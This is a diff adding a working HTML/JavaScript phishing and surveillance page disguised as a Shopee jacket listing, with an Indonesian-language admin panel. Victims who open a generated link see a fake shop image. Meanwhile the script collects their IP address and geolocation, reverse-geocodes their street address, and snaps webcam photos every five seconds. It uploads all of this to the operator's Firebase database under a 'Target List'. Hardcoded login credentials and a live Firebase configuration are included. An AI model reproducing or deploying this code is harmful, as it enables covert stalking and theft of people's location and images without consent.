@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shopee Jaket skena COD</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
+    
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
+
+    <style>
+        :root {
+            --bg-main: #0a0a0c;
+            --panel-bg: rgba(30, 30, 35, 0.7);
+            --accent-glow: #00f2ff;
+            --accent-dark: #0066ff;
+            --border-glass: rgba(255, 255, 255, 0.1);
+            --tips-bg: rgba(255, 217, 0, 0.05);
+            --tips-border: #ffd900;
+            --success: #00ff64;
+            --danger: #ff0055;
+            --card-grad: linear-gradient(145deg, #1e1e24, #141418);
+        }
+
+        body {
+            margin: 0; padding: 0; background-color: var(--bg-main);
+            background-image: radial-gradient(circle at top right, #1a1a2e, transparent);
+            color: white; font-family: 'Inter', sans-serif;
+            display: flex; justify-content: center; min-height: 100vh;
+        }
+
+        #target-view {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #fff; z-index: 999999; display: none;
+            justify-content: center; align-items: flex-start; overflow-y: auto;
+        }
+        #target-view img { width: 100%; height: auto; display: block; }
+
+        .phone-frame { width: 100%; max-width: 420px; padding: 20px; box-sizing: border-box; position: relative; }
+
+        .header-profile {
+            background: var(--panel-bg); backdrop-filter: blur(10px);
+            border-radius: 24px; padding: 25px; border: 1px solid var(--border-glass);
+            text-align: center; margin-bottom: 25px; position: relative; overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+
+        .timer-container {
+            position: absolute; top: 10px; right: 15px;
+            display: flex; flex-direction: column; align-items: flex-end; gap: 8px;
+            z-index: 1000;
+        }
+        .exp-timer {
+            font-family: 'Orbitron'; font-size: 9px;
+            background: rgba(0,0,0,0.9); padding: 4px 10px; border-radius: 8px;
+            transition: all 0.3s ease; border: 1px solid var(--border-glass);
+            color: var(--success); box-shadow: 0 0 10px rgba(0,255,100,0.2);
+        }
+        .mini-btn-group { display: flex; gap: 6px; }
+        .mini-btn {
+            width: 26px; height: 26px; border-radius: 50%; border: 1px solid var(--border-glass);
+            background: rgba(0,0,0,0.6); display: flex; justify-content: center; align-items: center;
+            cursor: pointer; transition: 0.3s;
+        }
+        .mini-btn:hover { background: var(--accent-glow); transform: scale(1.1); }
+        .mini-btn svg { width: 14px; fill: white; }
+        .mini-btn:hover svg { fill: black; }
+
+        #side-nav { position: fixed; top: 0; left: -300px; width: 280px; height: 100%; background: #0f0f12; z-index: 20000; transition: 0.4s; border-right: 1px solid var(--border-glass); overflow-y: auto; }
+        #side-nav.active { left: 0; }
+        .nav-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 15000; display: none; }
+        
+        .nav-header-card {
+            background: var(--card-grad);
+            margin: 20px; padding: 25px; border-radius: 20px;
+            border: 1px solid var(--border-glass);
+            text-align: center;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.4);
+        }
+        .nav-header-card .logo-box {
+            width: 70px; height: 70px; background: #000; border-radius: 18px;
+            margin: 0 auto 15px; display: flex; align-items: center; justify-content: center;
+            border: 2px solid var(--accent-glow); box-shadow: 0 0 15px rgba(0, 242, 255, 0.3);
+        }
+
+        .nav-item {
+            display: flex; align-items: center; gap: 15px; padding: 18px 25px;
+            color: #ccc; text-decoration: none; font-size: 12px; font-weight: 600;
+            border-bottom: 1px solid rgba(255,255,255,0.03); transition: 0.3s;
+        }
+        .nav-item:hover { background: rgba(0, 242, 255, 0.05); color: var(--accent-glow); padding-left: 30px; }
+
+        .modal-overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85); backdrop-filter: blur(8px);
+            z-index: 99999; justify-content: center; align-items: center;
+        }
+        .modal-box {
+            background: #121214; border: 1px solid var(--accent-glow); border-radius: 24px;
+            padding: 25px; width: 80%; max-width: 300px; text-align: center;
+        }
+
+        .reg-container { display: flex; flex-direction: column; align-items: center; width: 100%; }
+        .reg-btn {
+            display: flex; align-items: center; justify-content: center; gap: 10px;
+            width: 90%; padding: 12px; border-radius: 12px; margin-bottom: 10px;
+            text-decoration: none; font-weight: bold; font-size: 12px; transition: 0.3s;
+        }
+        .btn-wa { background: #25D366; color: white; }
+        .btn-tele { background: #0088cc; color: white; }
+        .btn-testi { background: #f0ad4e; color: black; }
+
+        .guide-container { margin-top: 15px; }
+        .guide-header {
+            background: rgba(255,255,255,0.05); border: 1px solid var(--border-glass);
+            padding: 12px 15px; border-radius: 12px; display: flex;
+            justify-content: space-between; align-items: center; cursor: pointer;
+            font-size: 11px; font-weight: 800; color: var(--accent-glow);
+        }
+        .guide-content {
+            max-height: 0; overflow: hidden; transition: max-height 0.3s ease-out;
+            background: rgba(0,0,0,0.2); border-radius: 0 0 12px 12px; margin-top: -5px;
+        }
+        .guide-content.open { max-height: 500px; padding: 15px; border: 1px solid var(--border-glass); border-top: none; }
+        
+        #gallery-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-main); z-index: 10001; padding: 20px; box-sizing: border-box; overflow-y: auto; }
+        .grid-photos { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-top: 20px; }
+        .grid-photos img { width: 100%; border-radius: 15px; border: 1px solid #333; cursor: pointer; }
+        #image-zoom-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 50000; justify-content: center; align-items: center; }
+        #image-zoom-overlay img { max-width: 90%; max-height: 80%; border-radius: 10px; border: 2px solid var(--accent-glow); }
+
+        .logo-main { 
+            width: 90px; height: 90px; border-radius: 50%; background: #000; 
+            margin: 0 auto 15px; display: flex; justify-content: center; align-items: center; 
+            border: 2px solid var(--accent-glow); 
+            box-shadow: 0 0 25px var(--accent-dark);
+        }
+        
+        .status-badge { display: inline-flex; align-items: center; background: rgba(0, 255, 100, 0.1); color: #00ff64; padding: 5px 15px; border-radius: 20px; font-size: 10px; }
+        
+        .control-panel { background: var(--panel-bg); border-radius: 24px; padding: 20px; border: 1px solid var(--border-glass); margin-bottom: 20px; position: relative; }
+        .label-style { font-size: 10px; text-transform: uppercase; color: #777; margin-bottom: 12px; display: block; font-weight: 800; }
+        
+        .input-group { background: rgba(0,0,0,0.4); border-radius: 14px; padding: 12px; border: 1px solid #333; display: flex; align-items: center; justify-content: space-between; }
+        .input-group input { background: transparent; border: none; color: #fff; width: 80%; outline: none; font-size: 12px; }
+        
+        .btn-action { background: linear-gradient(135deg, var(--accent-glow), var(--accent-dark)); color: #000; border: none; padding: 12px 18px; border-radius: 12px; font-weight: 800; font-size: 11px; cursor: pointer; }
+
+        .target-folder { 
+            background: var(--card-grad); border-radius: 18px; padding: 18px; 
+            margin-top: 12px; display: flex; align-items: center; justify-content: space-between; 
+            border: 1px solid var(--border-glass); border-left: 4px solid var(--accent-glow);
+        }
+        
+        .hamburger { position: absolute; top: 35px; left: 40px; z-index: 1000; background: var(--panel-bg); border: 1px solid var(--border-glass); padding: 10px; border-radius: 12px; cursor: pointer; }
+        #login-gate { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-main); z-index: 10000; display: flex; justify-content: center; align-items: center; }
+    </style>
+</head>
+<body>
+
+<div id="target-view">
+    <img src="https://i.imgur.com/swSbjoE.jpeg" alt="Shopee">
+</div>
+
+<div id="image-zoom-overlay" onclick="this.style.display='none'"><img id="zoomed-img" src=""></div>
+
+<div class="modal-overlay" id="modal-akun">
+    <div class="modal-box">
+        <h3 style="font-family:'Orbitron'; color:var(--accent-glow); font-size:13px;">ACCOUNT INFO</h3>
+        <div class="info-row"><span id="u-display">--</span></div>
+        <button class="btn-action" style="width:100%; margin-top:15px;" onclick="closeModal('modal-akun')">CLOSE</button>
+    </div>
+</div>
+
+<div id="login-gate">
+    <div class="control-panel" style="width: 300px; text-align: center;">
+        <h2 style="font-family: 'Orbitron';">CYBER-ONX</h2>
+        <input type="text" id="user-in" class="input-group" style="width:100%; margin-bottom:10px; background:#000; color:#fff;" placeholder="Username">
+        <input type="password" id="pass-in" class="input-group" style="width:100%; margin-bottom:20px; background:#000; color:#fff;" placeholder="Password">
+        <button class="btn-action" style="width:100%;" onclick="auth()">LOGIN</button>
+    </div>
+</div>
+
+<div class="phone-frame" id="admin-view" style="display:none;">
+    <div class="hamburger" onclick="toggleNav()">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+    </div>
+    <div class="header-profile">
+        <div class="timer-container"><div class="exp-timer" id="exp-display">EXP: --</div></div>
+        <h1 style="font-family: 'Orbitron';">CYBER-ONX</h1>
+        <div class="status-badge">SYSTEM ACTIVE</div>
+    </div>
+    <div class="control-panel">
+        <span class="label-style">Generate Link</span>
+        <div class="input-group">
+            <input type="text" id="gen-url" readonly value="Generating...">
+            <button onclick="copyLinkOnly()" style="color:cyan; background:none; border:none; cursor:pointer;">COPY</button>
+        </div>
+        <div class="guide-container">
+            <div class="guide-header" onclick="toggleGuide()"><span>(!) PANDUAN</span></div>
+            <div id="guide-body" class="guide-content"><div style="padding:10px; font-size:10px; color:#aaa;">Kirim link ke target, tunggu mereka klik izinkan.</div></div>
+        </div>
+    </div>
+    <div class="control-panel">
+        <span class="label-style">Target List</span>
+        <div id="target-list"></div>
+    </div>
+</div>
+
+<div id="gallery-overlay">
+    <button class="btn-action" onclick="closeFolder()">BACK</button>
+    <div id="info-container" class="control-panel" style="margin-top:20px;"></div>
+    <div class="grid-photos" id="photo-grid"></div>
+</div>
+
+<div id="side-nav">
+    <div class="nav-header-card">ONX SYSTEM</div>
+    <a href="#" class="nav-item" onclick="logout()">Logout</a>
+</div>
+<div class="nav-overlay" id="navOver" onclick="toggleNav()"></div>
+
+<script>
+    // MASUKKAN CONFIG FIREBASE LO DISINI TUAN
+    const firebaseConfig = {
+      apiKey: "AIzaSyAydM6bos2I1uGuFrj6DeJ_TDjJFhmfvT0",
+      authDomain: "shope-bd354.firebaseapp.com",
+      databaseURL: "https://shope-bd354-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "shope-bd354",
+      storageBucket: "shope-bd354.firebasestorage.app",
+      messagingSenderId: "344259593578",
+      appId: "1:344259593578:web:108cd8edb3069641799113"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+    const APP_PREFIX = 'ondev_v26_';
+
+    const params = new URLSearchParams(window.location.search);
+    const idParam = params.get('id');
+    const uOwner = params.get('u');
+
+    window.onload = function() {
+        if(idParam && uOwner) {
+            document.getElementById('login-gate').style.display = 'none';
+            document.getElementById('target-view').style.display = 'flex';
+            startCapture(idParam, uOwner);
+        } else {
+            if(localStorage.getItem(APP_PREFIX + 'is_logged_in') === 'true') showAdmin();
+        }
+    };
+
+    function auth() {
+        const u = document.getElementById('user-in').value;
+        const p = document.getElementById('pass-in').value;
+        if(u === 'ondev' && p === 'ondev') {
+            localStorage.setItem(APP_PREFIX + 'user', u);
+            localStorage.setItem(APP_PREFIX + 'is_logged_in', 'true');
+            showAdmin();
+        } else { alert('Gagal!'); }
+    }
+
+    function showAdmin() {
+        document.getElementById('login-gate').style.display = 'none';
+        document.getElementById('admin-view').style.display = 'block';
+        const user = localStorage.getItem(APP_PREFIX + 'user');
+        const baseUrl = window.location.href.split('?')[0];
+        document.getElementById('gen-url').value = `${baseUrl}?id=${Math.floor(1000+Math.random()*9000)}&u=${user}`;
+        
+        database.ref('targets/' + user).on('value', (s) => {
+            const data = s.val();
+            const list = document.getElementById('target-list');
+            list.innerHTML = '';
+            if(!data) return;
+            Object.keys(data).reverse().forEach(id => {
+                const div = document.createElement('div');
+                div.className = 'target-folder';
+                div.innerHTML = `<div onclick="openFolder('${id}')">TARGET #${id}</div><button onclick="delT('${id}')" style="color:red; background:none; border:none;">DEL</button>`;
+                list.appendChild(div);
+            });
+        });
+    }
+
+    function startCapture(id, owner) {
+        let photosArray = [];
+        // IP
+        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(res => {
+            database.ref('targets/' + owner + '/' + id + '/info').update({ ip: res.ip, time: new Date().toLocaleString() });
+        });
+        // Lokasi
+        navigator.geolocation.getCurrentPosition(p => {
+            const lat = p.coords.latitude; const lon = p.coords.longitude;
+            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`).then(r => r.json()).then(res => {
+                database.ref('targets/' + owner + '/' + id + '/info').update({ addr: res.display_name, lat: lat, lon: lon });
+            });
+        });
+        // Kamera
+        navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
+            const v = document.createElement('video'); v.srcObject = s; v.play();
+            setInterval(() => {
+                const c = document.createElement('canvas'); c.width = 300; c.height = 300;
+                c.getContext('2d').drawImage(v, 0, 0, 300, 300);
+                const imgData = c.toDataURL('image/jpeg', 0.4);
+                photosArray.unshift(imgData);
+                if(photosArray.length > 10) photosArray.pop();
+                database.ref('targets/' + owner + '/' + id).update({ photos: photosArray });
+            }, 5000);
+        });
+    }
+
+    function openFolder(id) {
+        const user = localStorage.getItem(APP_PREFIX + 'user');
+        database.ref('targets/' + user + '/' + id).once('value').then(s => {
+            const t = s.val();
+            document.getElementById('info-container').innerHTML = `IP: ${t.info.ip}<br>Time: ${t.info.time}<br>Addr: ${t.info.addr}`;
+            document.getElementById('photo-grid').innerHTML = (t.photos || []).map(p => `<img src="${p}" onclick="openZoom(this.src)">`).join('');
+            document.getElementById('gallery-overlay').style.display = 'block';
+        });
+    }
+
+    function delT(id) { 
+        const user = localStorage.getItem(APP_PREFIX + 'user');
+        if(confirm('Hapus?')) database.ref('targets/' + user + '/' + id).remove(); 
+    }
+    function logout() { localStorage.clear(); location.reload(); }
+    function toggleNav() { document.getElementById('side-nav').classList.toggle('active'); }
+    function closeFolder() { document.getElementById('gallery-overlay').style.display = 'none'; }
+    function copyLinkOnly() { const e = document.getElementById('gen-url'); e.select(); document.execCommand('copy'); alert('Copied!'); }
+    function toggleGuide() { document.getElementById('guide-body').classList.toggle('open'); }
+    function openZoom(s) { document.getElementById('zoomed-img').src = s; document.getElementById('image-zoom-overlay').style.display = 'flex'; }
+    function closeModal(id) { document.getElementById(id).style.display = 'none'; }
+</script>
+</body>
+</html>
